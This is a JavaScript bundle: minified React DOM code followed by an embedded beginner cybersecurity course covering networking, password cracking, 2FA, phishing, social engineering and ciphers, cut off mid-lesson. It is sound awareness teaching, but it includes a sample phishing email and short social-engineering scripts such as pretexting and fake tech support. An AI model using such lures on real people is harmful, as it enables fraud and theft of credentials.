Promise(function(u,r){c.onload=u,c.onerror=r}),rt(i,"link",a),l.instance=i}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(l,t),(t=l.state.preload)&&(l.state.loading&3)===0&&(e.count++,l=gs.bind(e),t.addEventListener("load",l),t.addEventListener("error",l))}}var Uu=0;function Ny(e,t){return e.stylesheets&&e.count===0&&bs(e,e.stylesheets),0<e.count||0<e.imgCount?function(l){var a=setTimeout(function(){if(e.stylesheets&&bs(e,e.stylesheets),e.unsuspend){var i=e.unsuspend;e.unsuspend=null,i()}},6e4+t);0<e.imgBytes&&Uu===0&&(Uu=62500*ny());var n=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&bs(e,e.stylesheets),e.unsuspend)){var i=e.unsuspend;e.unsuspend=null,i()}},(e.imgBytes>Uu?50:800)+t);return e.unsuspend=l,function(){e.unsuspend=null,clearTimeout(a),clearTimeout(n)}}:null}function gs(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)bs(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var vs=null;function bs(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,vs=new Map,t.forEach(Cy,e),vs=null,gs.call(e))}function Cy(e,t){if(!(t.state.loading&4)){var l=vs.get(e);if(l)var a=l.get(null);else{l=new Map,vs.set(e,l);for(var n=e.querySelectorAll("link[data-precedence],style[data-precedence]"),i=0;i<n.length;i++){var c=n[i];(c.nodeName==="LINK"||c.getAttribute("media")!=="not all")&&(l.set(c.dataset.precedence,c),a=c)}a&&l.set(null,a)}n=t.instance,c=n.getAttribute("data-precedence"),i=l.get(c)||a,i===a&&l.set(null,n),l.set(c,n),this.count++,a=gs.bind(this),n.addEventListener("load",a),n.addEventListener("error",a),i?i.parentNode.insertBefore(n,i.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(n,e.firstChild)),t.state.loading|=4}}var Fn={$$typeof:G,Provider:null,Consumer:null,_currentValue:K,_currentValue2:K,_threadCount:0};function Ay(e,t,l,a,n,i,c,u,r){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=dn(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=dn(0),this.hiddenUpdates=dn(null),this.identifierPrefix=a,this.onUncaughtError=n,this.onCaughtError=i,this.onRecoverableError=c,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=r,this.incompleteTransitions=new Map}function Yd(e,t,l,a,n,i,c,u,r,p,x,A){return e=new Ay(e,t,l,c,r,p,x,A,u),t=1,i===!0&&(t|=24),i=zt(3,null,null,t),e.current=i,i.stateNode=e,t=pc(),t.refCount++,e.pooledCache=t,t.refCount++,i.memoizedState={element:a,isDehydrated:l,cache:t},Sc(i),e}function qd(e){return e?(e=ka,e):ka}function Gd(e,t,l,a,n,i){n=qd(n),a.context===null?a.context=n:a.pendingContext=n,a=Ml(t),a.payload={element:l},i=i===void 0?null:i,i!==null&&(a.callback=i),l=Dl(e,a,t),l!==null&&(Nt(l,e,t),On(l,e,t))}function Vd(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var l=e.retryLane;e.retryLane=l!==0&&l<t?l:t}}function Lu(e,t){Vd(e,t),(e=e.alternate)&&Vd(e,t)}function Xd(e){if(e.tag===13||e.tag===31){var t=na(e,67108864);t!==null&&Nt(t,e,67108864),Lu(e,67108864)}}function Qd(e){if(e.tag===13||e.tag===31){var t=Dt();t=T(t);var l=na(e,t);l!==null&&Nt(l,e,t),Lu(e,t)}}var Ss=!0;function Ey(e,t,l,a){var n=S.T;S.T=null;var i=_.p;try{_.p=2,Bu(e,t,l,a)}finally{_.p=i,S.T=n}}function zy(e,t,l,a){var n=S.T;S.T=null;var i=_.p;try{_.p=8,Bu(e,t,l,a)}finally{_.p=i,S.T=n}}function Bu(e,t,l,a){if(Ss){var n=Yu(a);if(n===null)Cu(e,t,a,xs,l),Kd(e,a);else if(wy(n,e,t,l,a))a.stopPropagation();else if(Kd(e,a),t&4&&-1<Oy.indexOf(e)){for(;n!==null;){var i=il(n);if(i!==null)switch(i.tag){case 3:if(i=i.stateNode,i.current.memoizedState.isDehydrated){var c=nl(i.pendingLanes);if(c!==0){var u=i;for(u.pendingLanes|=2,u.entangledLanes|=2;c;){var r=1<<31-gt(c);u.entanglements[1]|=r,c&=~r}el(i),(je&6)===0&&(as=yt()+500,Qn(0))}}break;case 31:case 13:u=na(i,2),u!==null&&Nt(u,i,2),is(),Lu(i,2)}if(i=Yu(a),i===null&&Cu(e,t,a,xs,l),i===n)break;n=i}n!==null&&a.stopPropagation()}else Cu(e,t,a,null,l)}}function Yu(e){return e=Gs(e),qu(e)}var xs=null;function qu(e){if(xs=null,e=at(e),e!==null){var t=W(e);if(t===null)e=null;else{var l=t.tag;if(l===13){if(e=ce(t),e!==null)return e;e=null}else if(l===31){if(e=Me(t),e!==null)return e;e=null}else if(l===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return xs=e,null}function Zd(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(si()){case ci:return 2;case ui:return 8;case ba:case fn:return 32;case oi:return 268435456;default:return 32}default:return 32}}var Gu=!1,Xl=null,Ql=null,Zl=null,In=new Map,Pn=new Map,Kl=[],Oy="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Kd(e,t){switch(e){case"focusin":case"focusout":Xl=null;break;case"dragenter":case"dragleave":Ql=null;break;case"mouseover":case"mouseout":Zl=null;break;case"pointerover":case"pointerout":In.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Pn.delete(t.pointerId)}}function ei(e,t,l,a,n,i){return e===null||e.nativeEvent!==i?(e={blockedOn:t,domEventName:l,eventSystemFlags:a,nativeEvent:i,targetContainers:[n]},t!==null&&(t=il(t),t!==null&&Xd(t)),e):(e.eventSystemFlags|=a,t=e.targetContainers,n!==null&&t.indexOf(n)===-1&&t.push(n),e)}function wy(e,t,l,a,n){switch(t){case"focusin":return Xl=ei(Xl,e,t,l,a,n),!0;case"dragenter":return Ql=ei(Ql,e,t,l,a,n),!0;case"mouseover":return Zl=ei(Zl,e,t,l,a,n),!0;case"pointerover":var i=n.pointerId;return In.set(i,ei(In.get(i)||null,e,t,l,a,n)),!0;case"gotpointercapture":return i=n.pointerId,Pn.set(i,ei(Pn.get(i)||null,e,t,l,a,n)),!0}return!1}function Jd(e){var t=at(e.target);if(t!==null){var l=W(t);if(l!==null){if(t=l.tag,t===13){if(t=ce(l),t!==null){e.blockedOn=t,M(e.priority,function(){Qd(l)});return}}else if(t===31){if(t=Me(l),t!==null){e.blockedOn=t,M(e.priority,function(){Qd(l)});return}}else if(t===3&&l.stateNode.current.memoizedState.isDehydrated){e.blockedOn=l.tag===3?l.stateNode.containerInfo:null;return}}}e.blockedOn=null}function js(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var l=Yu(e.nativeEvent);if(l===null){l=e.nativeEvent;var a=new l.constructor(l.type,l);qs=a,l.target.dispatchEvent(a),qs=null}else return t=il(l),t!==null&&Xd(t),e.blockedOn=l,!1;t.shift()}return!0}function Wd(e,t,l){js(e)&&l.delete(t)}function _y(){Gu=!1,Xl!==null&&js(Xl)&&(Xl=null),Ql!==null&&js(Ql)&&(Ql=null),Zl!==null&&js(Zl)&&(Zl=null),In.forEach(Wd),Pn.forEach(Wd)}function Ts(e,t){e.blockedOn===t&&(e.blockedOn=null,Gu||(Gu=!0,z.unstable_scheduleCallback(z.unstable_NormalPriority,_y)))}var Ns=null;function $d(e){Ns!==e&&(Ns=e,z.unstable_scheduleCallback(z.unstable_NormalPriority,function(){Ns===e&&(Ns=null);for(var t=0;t<e.length;t+=3){var l=e[t],a=e[t+1],n=e[t+2];if(typeof a!="function"){if(qu(a||l)===null)continue;break}var i=il(l);i!==null&&(e.splice(t,3),t-=3,Yc(i,{pending:!0,data:n,method:l.method,action:a},a,n))}}))}function sn(e){function t(r){return Ts(r,e)}Xl!==null&&Ts(Xl,e),Ql!==null&&Ts(Ql,e),Zl!==null&&Ts(Zl,e),In.forEach(t),Pn.forEach(t);for(var l=0;l<Kl.length;l++){var a=Kl[l];a.blockedOn===e&&(a.blockedOn=null)}for(;0<Kl.length&&(l=Kl[0],l.blockedOn===null);)Jd(l),l.blockedOn===null&&Kl.shift();if(l=(e.ownerDocument||e).$$reactFormReplay,l!=null)for(a=0;a<l.length;a+=3){var n=l[a],i=l[a+1],c=n[fe]||null;if(typeof i=="function")c||$d(l);else if(c){var u=null;if(i&&i.hasAttribute("formAction")){if(n=i,c=i[fe]||null)u=c.formAction;else if(qu(n)!==null)continue}else u=c.action;typeof u=="function"?l[a+1]=u:(l.splice(a,3),a-=3),$d(l)}}}function Fd(){function e(i){i.canIntercept&&i.info==="react-transition"&&i.intercept({handler:function(){return new Promise(function(c){return n=c})},focusReset:"manual",scroll:"manual"})}function t(){n!==null&&(n(),n=null),a||setTimeout(l,20)}function l(){if(!a&&!navigation.transition){var i=navigation.currentEntry;i&&i.url!=null&&navigation.navigate(i.url,{state:i.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var a=!1,n=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(l,100),function(){a=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),n!==null&&(n(),n=null)}}}function Vu(e){this._internalRoot=e}Cs.prototype.render=Vu.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(m(409));var l=t.current,a=Dt();Gd(l,a,e,t,null,null)},Cs.prototype.unmount=Vu.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;Gd(e.current,2,null,e,null,null),is(),t[Ue]=null}};function Cs(e){this._internalRoot=e}Cs.prototype.unstable_scheduleHydration=function(e){if(e){var t=E();e={blockedOn:null,target:e,priority:t};for(var l=0;l<Kl.length&&t!==0&&t<Kl[l].priority;l++);Kl.splice(l,0,e),l===0&&Jd(e)}};var Id=B.version;if(Id!=="19.2.4")throw Error(m(527,Id,"19.2.4"));_.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(m(188)):(e=Object.keys(e).join(","),Error(m(268,e)));return e=C(t),e=e!==null?ue(e):null,e=e===null?null:e.stateNode,e};var My={bundleType:0,version:"19.2.4",rendererPackageName:"react-dom",currentDispatcherRef:S,reconcilerVersion:"19.2.4"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var As=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!As.isDisabled&&As.supportsFiber)try{$l=As.inject(My),pt=As}catch{}}return li.createRoot=function(e,t){if(!k(e))throw Error(m(299));var l=!1,a="",n=nf,i=sf,c=cf;return t!=null&&(t.unstable_strictMode===!0&&(l=!0),t.identifierPrefix!==void 0&&(a=t.identifierPrefix),t.onUncaughtError!==void 0&&(n=t.onUncaughtError),t.onCaughtError!==void 0&&(i=t.onCaughtError),t.onRecoverableError!==void 0&&(c=t.onRecoverableError)),t=Yd(e,1,!1,null,null,l,a,null,n,i,c,Fd),e[Ue]=t.current,Nu(e),new Vu(t)},li.hydrateRoot=function(e,t,l){if(!k(e))throw Error(m(299));var a=!1,n="",i=nf,c=sf,u=cf,r=null;return l!=null&&(l.unstable_strictMode===!0&&(a=!0),l.identifierPrefix!==void 0&&(n=l.identifierPrefix),l.onUncaughtError!==void 0&&(i=l.onUncaughtError),l.onCaughtError!==void 0&&(c=l.onCaughtError),l.onRecoverableError!==void 0&&(u=l.onRecoverableError),l.formState!==void 0&&(r=l.formState)),t=Yd(e,1,!0,t,l??null,a,n,r,i,c,u,Fd),t.context=qd(null),l=t.current,a=Dt(),a=T(a),n=Ml(a),n.callback=null,Dl(l,n,a),l=a,t.current.lanes=l,Il(t,l),el(t),e[Ue]=t.current,Nu(e),new Cs(t)},li.version="19.2.4",li}var uh;function Gy(){if(uh)return Zu.exports;uh=1;function z(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(z)}catch(B){console.error(B)}}return z(),Zu.exports=qy(),Zu.exports}var Vy=Gy();const Qt={title:"Cybersecurity",subtitle:"Learn to protect yourself and hack ethically",chapters:[{id:1,title:"Welcome to Cybersecurity",description:"What hackers do and why it matters",lessons:[{id:"1-1",title:"What is Cybersecurity?",duration:"8 min",content:`
## Welcome, Future Cyber Defender! 🛡️

Every day, hackers attack millions of computers, phones, and websites. **Cybersecurity** is the art of defending against these attacks — and understanding how they work.

### Why Should You Care?

Think about everything connected to the internet:
- Your phone 📱
- Your gaming console 🎮
- Smart TVs, cameras, doorbells 📷
- Cars, hospitals, power plants ⚡

ALL of these can be hacked. And someone needs to protect them.

### The Three Types of Hackers

| Type | Also Called | What They Do |
|------|-----------|-------------|
| **White Hat** | Ethical Hacker | Gets paid to find & fix security holes |
| **Black Hat** | Criminal Hacker | Breaks into systems illegally |
| **Gray Hat** | Somewhere in between | Finds bugs without permission, but reports them |

### What You'll Learn

In this course, you'll think like a hacker (the good kind!):

✅ How passwords get cracked
✅ How websites get hacked
✅ How to spot phishing scams
✅ How to protect your accounts
✅ How encryption works
✅ How to analyze network traffic
✅ Real hacking tools (used ethically!)

### The CIA Triad

The foundation of all cybersecurity:

- **C**onfidentiality — Only authorized people see the data
- **I**ntegrity — Data hasn't been tampered with
- **A**vailability — Systems are up and running when needed

\`\`\`
       Confidentiality
           /\\
          /  \\
         /    \\
        /  CIA  \\
       /________\\
  Integrity    Availability
\`\`\`

Every security decision balances these three goals.

### Real-World Cyber Attacks

| Attack | Year | What Happened |
|--------|------|--------------|
| Yahoo Breach | 2013 | 3 billion accounts stolen |
| WannaCry | 2017 | Ransomware hit 200,000 computers |
| SolarWinds | 2020 | Hackers infiltrated US government |
| Colonial Pipeline | 2021 | Shut down fuel supply for days |

<tip>
💡 Cybersecurity jobs pay $80,000-$200,000+ and there's a massive shortage of skilled workers!
</tip>

### The Golden Rule

**Never hack anything you don't have permission to hack.**

This course teaches you skills for defense and ethical hacking ONLY. Using these skills illegally can land you in serious trouble.

Ready to become a cyber defender? Let's go! 🚀
          `},{id:"1-2",title:"How the Internet Actually Works",duration:"10 min",content:`
## Under the Hood of the Internet 🌐

To defend the internet, you need to understand how it works!

### IP Addresses — Your Digital Address

Every device on the internet has an **IP address**:

\`\`\`
Your computer:  192.168.1.100  (private/local)
Google's server: 142.250.80.46  (public)
\`\`\`

**IPv4**: 4 numbers, 0-255 each → \`192.168.1.1\`
**IPv6**: Longer, newer format → \`2001:0db8:85a3::8a2e:0370:7334\`

### DNS — The Internet's Phone Book

When you type \`google.com\`, your computer asks a **DNS server**: "What's the IP for google.com?"

\`\`\`
You → "What IP is google.com?"
DNS → "It's 142.250.80.46"
You → connects to 142.250.80.46
\`\`\`

\`\`\`bash
# Try it yourself! Open terminal and type:
nslookup google.com

# Or:
ping google.com
\`\`\`

### Ports — Doors Into a Computer

Each computer has **65,535 ports**. Think of them as doors:

| Port | Service | What It Does |
|------|---------|-------------|
| 80 | HTTP | Regular websites |
| 443 | HTTPS | Secure websites |
| 22 | SSH | Remote access |
| 25 | SMTP | Email sending |
| 3306 | MySQL | Databases |

<warning>
⚠️ Open ports are like unlocked doors — hackers scan for them!
</warning>

### HTTP vs HTTPS

\`\`\`
HTTP  = Sending a postcard (anyone can read it)
HTTPS = Sending a sealed letter (encrypted!)
\`\`\`

Always check for the 🔒 lock icon in your browser!

### Packets — How Data Travels

Data doesn't travel as one big file. It's broken into **packets**:

\`\`\`
Your message: "Hello World!"

Split into packets:
[Packet 1] "Hel" → Route A → ✓
[Packet 2] "lo "  → Route B → ✓
[Packet 3] "Wor" → Route A → ✓
[Packet 4] "ld!" → Route C → ✓

Reassembled: "Hello World!"
\`\`\`

Each packet contains:
- **Source IP** — Where it came from
- **Destination IP** — Where it's going
- **Data** — The actual content
- **Checksum** — Verify it wasn't corrupted

### The OSI Model (Simplified)

\`\`\`
7. Application  ← You interact here (browser, email)
6. Presentation ← Data formatting (encryption)
5. Session      ← Connection management
4. Transport    ← TCP/UDP (reliable delivery)
3. Network      ← IP addresses, routing
2. Data Link    ← MAC addresses, switches
1. Physical     ← Cables, Wi-Fi signals
\`\`\`

<tip>
💡 Hackers can attack at ANY layer. That's why security needs to cover all of them!
</tip>

### Try It: See Your Network Info

\`\`\`bash
# Windows
ipconfig

# Mac/Linux
ifconfig
# or
ip addr

# See your public IP
curl ifconfig.me
\`\`\`

Understanding networking is the foundation of cybersecurity! 🎯
          `}]},{id:2,title:"Passwords & Authentication",description:"How passwords get cracked and how to stay safe",lessons:[{id:"2-1",title:"How Passwords Get Cracked",duration:"12 min",content:`
## Password Cracking 101 🔓

Passwords are the #1 way we protect accounts. And the #1 thing hackers target.

### How Passwords Are Stored

Websites DON'T store your actual password (usually). They store a **hash**:

\`\`\`
Your password: "minecraft123"
        ↓ Hash Function (SHA-256)
Stored hash: "a1b2c3d4e5f6789..."
\`\`\`

A hash is a one-way function — you can't reverse it to get the password back.

\`\`\`python
# Python example of hashing
import hashlib

password = "minecraft123"
hashed = hashlib.sha256(password.encode()).hexdigest()
print(hashed)
# Output: a1b2c3d4e5f6... (always the same for same input!)
\`\`\`

### Attack #1: Brute Force

Try EVERY possible combination:

\`\`\`
Trying: a        ✗
Trying: b        ✗
Trying: c        ✗
...
Trying: aa       ✗
Trying: ab       ✗
...
(This takes forever for long passwords!)
\`\`\`

| Password Length | Possible Combos | Time to Crack |
|----------------|----------------|--------------|
| 4 characters | 14 million | Instant |
| 6 characters | 19 billion | Seconds |
| 8 characters | 6 trillion | Hours |
| 12 characters | 95 sextillion | Centuries |
| 16 characters | ... | Heat death of universe |

### Attack #2: Dictionary Attack

Use a list of common passwords:

\`\`\`
password       ✗
123456         ✗
qwerty         ✗
minecraft123   ✓ FOUND!
\`\`\`

### The Most Common Passwords (DON'T use these!)

1. 123456
2. password
3. 123456789
4. qwerty
5. abc123
6. password1
7. iloveyou
8. 12345678

<warning>
⚠️ If your password is on this list, change it RIGHT NOW!
</warning>

### Attack #3: Rainbow Tables

Pre-computed hashes for millions of passwords:

\`\`\`
"password"    → 5e884898da28047...
"123456"      → 8d969eef6ecad3c...
"minecraft"   → 7c9e7c1b2d4f8a1...
\`\`\`

Hackers just look up the hash! That's why websites use **salting**:

\`\`\`
password + random_salt → unique_hash
"minecraft" + "x7k2" → "completely_different_hash"
"minecraft" + "p9m1" → "another_different_hash"
\`\`\`

Same password, different salt = different hash. Rainbow tables become useless!

### Attack #4: Credential Stuffing

1. Hacker gets leaked passwords from Site A
2. Tries same email/password on Site B, C, D...
3. People reuse passwords → accounts get hacked

<tip>
💡 This is why you should NEVER reuse passwords across different sites!
</tip>

### How to Make Strong Passwords

**Bad:** \`minecraft123\` (dictionary word + numbers)
**Better:** \`M!n3cr@ft_2024!\` (substitutions)
**Best:** \`correct-horse-battery-staple\` (passphrase!)

Passphrases are:
- Easy to remember
- Hard to crack
- Long = more secure

\`\`\`
4 random words = 20+ characters = extremely secure
"purple-elephant-dancing-tuesday"
\`\`\`

You now understand how hackers crack passwords! 🎓
          `},{id:"2-2",title:"Two-Factor Authentication",duration:"8 min",content:`
## The Extra Lock on Your Door 🔐

Even the strongest password can be stolen. That's where **2FA** comes in!

### What is 2FA?

Two-Factor Authentication requires TWO things to log in:

\`\`\`
Factor 1: Something you KNOW (password)
    +
Factor 2: Something you HAVE (phone/key)
    =
Much harder to hack!
\`\`\`

### Types of 2FA

| Method | Security | Convenience |
|--------|----------|------------|
| SMS Code | ⭐⭐ | ⭐⭐⭐⭐⭐ |
| Authenticator App | ⭐⭐⭐⭐ | ⭐⭐⭐⭐ |
| Hardware Key (YubiKey) | ⭐⭐⭐⭐⭐ | ⭐⭐⭐ |
| Biometric (fingerprint) | ⭐⭐⭐⭐ | ⭐⭐⭐⭐⭐ |

### Why SMS 2FA is Weak

**SIM Swapping Attack:**
1. Hacker calls your phone carrier
2. Pretends to be you
3. Transfers your number to their SIM
4. Now THEY get your SMS codes!

\`\`\`
Hacker: "Hi, I lost my phone. Can you transfer 
         my number to this new SIM?"
Carrier: "Sure! What's your mother's maiden name?"
Hacker: (found it on social media) "Smith"
Carrier: "Done!"
Your 2FA codes: → Hacker's phone 😱
\`\`\`

### Authenticator Apps (Recommended!)

Apps like **Google Authenticator** or **Authy** generate codes that change every 30 seconds:

\`\`\`
Your app shows: 847 291
                ████████░░ (25 seconds left)

After 30 seconds: 163 502
                  ██░░░░░░░░ (new code!)
\`\`\`

### How TOTP Works

\`\`\`
Secret Key (shared once) + Current Time
        ↓
    HMAC Algorithm
        ↓
    6-digit code
\`\`\`

\`\`\`python
# Simplified TOTP concept
import time
import hashlib

secret = "JBSWY3DPEHPK3PXP"
time_step = int(time.time() / 30)  # Changes every 30 sec
code = hashlib.sha1(f"{secret}{time_step}".encode()).hexdigest()[-6:]
print(f"Your code: {code}")
\`\`\`

### Hardware Security Keys

Physical USB keys (like YubiKey):
- Plug in and tap to authenticate
- **Impossible** to phish remotely
- Used by Google employees (zero phishing since adoption!)

### Set Up 2FA NOW!

Priority accounts to protect:
1. **Email** (password reset for everything!)
2. **Banking/Financial**
3. **Social Media**
4. **Gaming accounts** (Steam, etc.)

<tip>
💡 Always save your **backup codes** when setting up 2FA! Store them somewhere safe offline.
</tip>

### Password Managers

Use one to generate and store unique passwords:
- **Bitwarden** (free, open source)
- **1Password** (paid, great UI)
- **KeePass** (free, local only)

\`\`\`
Without manager: Same password everywhere 😰
With manager: Unique 24-char password per site 💪
\`\`\`

You only need to remember ONE master password!

Enable 2FA on everything. It's the single best thing you can do for security! 🔐
          `}]},{id:3,title:"Social Engineering",description:"Hacking the human mind",lessons:[{id:"3-1",title:"Phishing Attacks",duration:"10 min",content:`
## The Art of Deception 🎣

The easiest way to hack someone? **Ask them for their password.** Seriously.

### What is Phishing?

Fake emails/messages that trick you into giving up information:

\`\`\`
From: security@amaz0n.com  ← Notice the ZERO!
Subject: Your account has been compromised!

Dear Customer,

We detected suspicious activity. Click here to 
verify your identity immediately or your account 
will be suspended in 24 hours!

[VERIFY NOW] ← Links to fake-amazon-login.com
\`\`\`

### Spot the Red Flags 🚩

1. **Urgency** — "Act NOW or else!"
2. **Fear** — "Your account is compromised!"
3. **Bad sender** — \`security@amaz0n.com\` (not amazon.com)
4. **Suspicious links** — Hover before clicking!
5. **Grammar errors** — "Dear Valued Customers"
6. **Generic greeting** — "Dear Customer" not your name
7. **Too good to be true** — "You won $1,000,000!"

### Types of Phishing

| Type | Target | Example |
|------|--------|---------|
| **Phishing** | Anyone | Mass fake emails |
| **Spear Phishing** | Specific person | Researched, personalized |
| **Whaling** | CEO/executives | High-value targets |
| **Smishing** | Via SMS | "Your package is delayed" |
| **Vishing** | Via phone call | "This is the IRS..." |

### Real Phishing Examples

**Fake Login Page:**
\`\`\`
Real:  https://accounts.google.com/login
Fake:  https://accounts.g00gle.com/login  ← zeros!
Fake:  https://google-accounts-login.com  ← wrong domain!
Fake:  https://accounts.google.com.evil.com/login ← subdomain trick!
\`\`\`

**URL Anatomy:**
\`\`\`
https://accounts.google.com.evil.com/login
         ↑                    ↑
    looks legit          ACTUAL domain is evil.com!
\`\`\`

<warning>
⚠️ Always check the ACTUAL domain — it's the part right before .com/.org/.net!
</warning>

### How to Check a Suspicious Email

\`\`\`
1. Don't click any links!
2. Check the sender's FULL email address
3. Hover over links to see real URL
4. Look for urgency/fear tactics
5. When in doubt, go directly to the website
   (type it yourself, don't click the link)
\`\`\`

### Phishing Quiz

Which URL is real?

\`\`\`
A) https://www.paypal.com/login
B) https://www.paypa1.com/login
C) https://paypal.secure-login.com
D) https://www.paypal.com.verify.net/login
\`\`\`

Answer: **A** — it's the only one with the real paypal.com domain!

<tip>
💡 When in doubt, NEVER click email links. Open your browser and type the website address yourself!
</tip>

### Social Media Phishing

Hackers use info from your profiles to make convincing attacks:

\`\`\`
Public info they find:
- Your school name
- Your pet's name
- Your birthday
- Your friends list
- Where you work

They use this to:
- Guess security questions
- Create targeted phishing
- Impersonate your friends
\`\`\`

Stay skeptical! If something feels off, it probably is. 🎯
          `},{id:"3-2",title:"Social Engineering Tactics",duration:"10 min",content:`
## Hacking Without Code 🧠

**Social engineering** is manipulating people into breaking security. No code needed!

### The 6 Principles of Influence

Hackers exploit these psychological principles:

**1. Authority**
\`\`\`
"Hi, I'm from the IT department. I need your 
password to fix a critical issue."
→ People obey authority figures
\`\`\`

**2. Urgency**
\`\`\`
"Your account will be deleted in 1 HOUR unless 
you verify RIGHT NOW!"
→ Panic overrides critical thinking
\`\`\`

**3. Social Proof**
\`\`\`
"Everyone in your department has already updated 
their passwords using this link."
→ If others did it, it must be safe
\`\`\`

**4. Reciprocity**
\`\`\`
"I helped fix your computer last week, remember? 
I just need a small favor..."
→ We feel obligated to return favors
\`\`\`

**5. Liking**
\`\`\`
"Hey! We met at the conference, right? Great 
presentation! By the way..."
→ We trust people we like
\`\`\`

**6. Scarcity**
\`\`\`
"Only the first 10 people get free access! 
Click now before it's gone!"
→ Fear of missing out
\`\`\`

### Real Attack: Tailgating

Following someone through a locked door:

\`\`\`
*Employee badges into building*
Hacker: "Oh hey, can you hold the door? 
         My hands are full!" 📦
Employee: "Sure!"
Hacker: *walks right into secure building*
\`\`\`

### Real Attack: Pretexting

Creating a fake scenario:

\`\`\`
Hacker calls reception:
"Hi, I'm from Cisco doing a network audit. 
I need the admin password for router 
configuration check."

Receptionist: "Oh, let me ask... 
The admin password is 'cisco123'"
\`\`\`

### Real Attack: Baiting

Leaving infected USB drives in parking lots:

\`\`\`
*Employee finds USB labeled "Salary Data 2024"*
Employee: "Ooh, interesting!" *plugs it in*
USB: *installs malware* 😈
\`\`\`

<warning>
⚠️ NEVER plug in USB drives you find! They could contain malware that runs automatically.
</warning>

### Real Attack: Quid Pro Quo

\`\`\`
Hacker calls employees randomly:
"Hi, I'm tech support. Are you having 
any computer problems?"

Employee: "Actually, yes! My email is slow."

Hacker: "I can fix that! Just install this 
remote access tool and give me your login..."
\`\`\`

### Defense Strategies

\`\`\`
✅ Verify identity independently
   (Call them back on a known number)

✅ Never give passwords over phone/email
   (IT will NEVER ask for your password)

✅ Question urgency
   ("Let me verify this first")

✅ Be suspicious of unsolicited help

✅ Report suspicious contacts
\`\`\`

<tip>
💡 The best defense against social engineering is awareness. Now that you know these tricks, they're much less likely to work on you!
</tip>

### Try This: Social Engineering Awareness

Next time you get a suspicious email or message:
1. Identify which principle(s) of influence it uses
2. Find the red flags
3. Think about what the attacker wants

Practice makes you harder to hack! 🛡️
          `}]},{id:4,title:"Encryption & Cryptography",description:"The math that keeps secrets safe",lessons:[{id:"4-1",title:"Encryption Basics",duration:"12 min",content:`
## Secret Messages 🔐

Encryption turns readable text into unreadable gibberish — and back again!

### Plaintext vs Ciphertext

\`\`\`
Plaintext:  "HELLO WORLD"     (readable)
     ↓ Encrypt with key
Ciphertext: "KHOOR ZRUOG"     (gibberish)
     ↓ Decrypt with key
Plaintext:  "HELLO WORLD"     (readable again!)
\`\`\`

### Caesar Cipher (The Oldest Encryption)

Shift each letter by N positions:

\`\`\`
Key: Shift by 3

A → D    H → K
B → E    E → H
C → F    L → O
...      O → R

HELLO → KHOOR
\`\`\`

\`\`\`python
# Caesar Cipher in Python
def caesar_encrypt(text, shift):
    result = ""
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            result += chr((ord(char) - base + shift) % 26 + base)
        else:
            result += char
    return result

# Encrypt
secret = caesar_encrypt("HELLO WORLD", 3)
print(secret)  # KHOOR ZRUOG

# Decrypt (shift backwards)
original = caesar_encrypt(secret, -3)
print(original)  # HELLO WORLD
\`\`\`

### Why Caesar Cipher is Weak

Only 26 possible shifts — try them all!

\`\`\`
KHOOR → shift 1  → JGNNQ  ✗
KHOOR → shift 2  → IFMMP  ✗
KHOOR → shift 3  → HELLO  ✓ Found it!
\`\`\`

### Symmetric Encryption

Same key to encrypt AND decrypt:

\`\`\`
    Key: "mysecretkey"
         ↓
